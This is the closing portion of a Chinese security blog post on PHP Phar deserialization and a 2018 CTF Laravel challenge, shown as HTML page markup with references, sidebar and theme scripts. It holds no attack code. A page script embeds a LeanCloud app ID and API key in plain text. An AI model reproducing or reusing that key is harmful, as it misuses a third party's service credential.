+<p>3、有可利用的 <strong>POP链</strong> 。</p>
+<p>当然做这道择护网杯 2018 easy_laravel的时候，因为自己之前只看过thinkphp，没用过Laravel，所以对于这个框架做题时候还不是很熟悉。学习到了 <strong>Laravel 5.4重置密码</strong> 的trick，以及 <strong>blade渲染</strong> 的问题。</p>
+<p>感谢 <strong>4uuu Nya</strong> 师傅出了一道这么有趣的题目，感谢 <strong>ZSX师傅</strong> 的深入探究，学到了。</p>
+<h2 id="Refer"><a href="#Refer" class="headerlink" title="Refer"></a>Refer</h2><p><a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">利用 phar 拓展 php 反序列化漏洞攻击面</a></p>
+<p><a href="https://kylingit.com/blog/%E7%94%B1phpggc%E7%90%86%E8%A7%A3php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">由phpggc理解php反序列化漏洞</a></p>
+<p><a href="https://blog.zsxsoft.com/post/38" target="_blank" rel="noopener"> Phar与Stream Wrapper造成PHP RCE的深入挖掘</a></p>
+<p><a href="http://www.venenof.com/index.php/archives/565/" target="_blank" rel="noopener">护网杯-easy laravel-Writeup</a></p>
+<p><a href="https://xz.aliyun.com/t/2912" target="_blank" rel="noopener">护网杯2018 easy_laravel writeup与记录</a></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>l1nk3r</li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="http://www.lmxspace.com/2018/11/07/重新认识反序列化-Phar/" title="重新认识反序列化-Phar">http://www.lmxspace.com/2018/11/07/重新认识反序列化-Phar/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 4.0</a> unless stating additionally.</li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/php/" rel="tag"><i class="fa fa-tag"></i> php</a>
+          
+            <a href="/tags/ctf/" rel="tag"><i class="fa fa-tag"></i> ctf</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/09/12/CVE-2018-8420-复现/" rel="next" title="CVE-2018-8420 复现">
+                <i class="fa fa-chevron-left"></i> CVE-2018-8420 复现
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.jpg"
+                alt="l1nk3r" />
+            
+              <p class="site-author-name" itemprop="name">l1nk3r</p>
+              <p class="site-description motion-element" itemprop="description">愿你出走半生，归来仍是少年</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">25</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">7</span>
+                    <span class="site-state-item-name">categories</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">24</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/sukaralin" target="_blank" title="GitHub"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="mailto:sukaralin@gmail.com" target="_blank" title="E-Mail"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://weibo.com/SukaraLin" target="_blank" title="Weibo"><i class="fa fa-fw fa-weibo"></i>Weibo</a>
+                  
+                </span>
+              
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-起源"><span class="nav-text">0x01 起源</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-原理分析"><span class="nav-text">0x02 原理分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#一、何为phar文件"><span class="nav-text">一、何为phar文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#二、为何phar在文件函数中能够反序列化"><span class="nav-text">二、为何phar在文件函数中能够反序列化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#三、进一步探究"><span class="nav-text">三、进一步探究</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-漏洞利用"><span class="nav-text">0x03 漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-总结"><span class="nav-text">0x04 总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Refer"><span class="nav-text">Refer</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">l1nk3r</span>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.4.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.4.1"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=6.4.1"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.4.1"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.4.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.4.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.4.1"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  <script>
+    
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+
+      Counter('get', '/classes/Counter', { where: JSON.stringify({ url }) })
+        .done(function ({ results }) {
+          if (results.length > 0) {
+            var counter = results[0];
+            
+              var $element = $(document.getElementById(url));
+              $element.find('.leancloud-visitors-count').text(counter.time + 1);
+            
+            Counter('put', `/classes/Counter/${counter.objectId}`, JSON.stringify({ time: { "__op":"Increment", "amount":1 } }))
+            
+            .fail(function ({ responseJSON }) {
+                console.log('Failed to save Visitor num, with error message: ' + responseJSON.error);
+            })
+          } else {
+            
+              Counter('post', '/classes/Counter', JSON.stringify({ title: title, url: url, time: 1}))
+                .done(function () {
+                  var $element = $(document.getElementById(url));
+                  $element.find('.leancloud-visitors-count').text(1);
+                })
+                .fail(function () {
+                  console.log('Failed to create');
+                });
+            
+          }
+        })
+      .fail(function ({ responseJSON }) {
+        console.log('LeanCloud Counter Error:' + responseJSON.code + " " + responseJSON.error);
+      });
+    }
+    
+
+    $(function() {
+      $.get('https://app-router.leancloud.cn/2/route?appId=' + "B9FGnsb12m0SgeUt1Ks30osH-gzGzoHsz")
+        .done(function ({ api_server }) {
+          var Counter = function (method, url, data) {
+            return $.ajax({
+              method: method,
+              url: `https://${api_server}/1.1${url}`,
+              headers: {
+                'X-LC-Id': "B9FGnsb12m0SgeUt1Ks30osH-gzGzoHsz",
+                'X-LC-Key': "VJzXbdTqOCo8jcVFjXNw7fRX",
+                'Content-Type': 'application/json',
+              },
+              data: data,
+            });
+          };
+          
+          addCount(Counter);
+          
+        })
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
+<!-- 页面点击小红心 --> <script type="text/javascript" src="/js/src/love.js"></script>
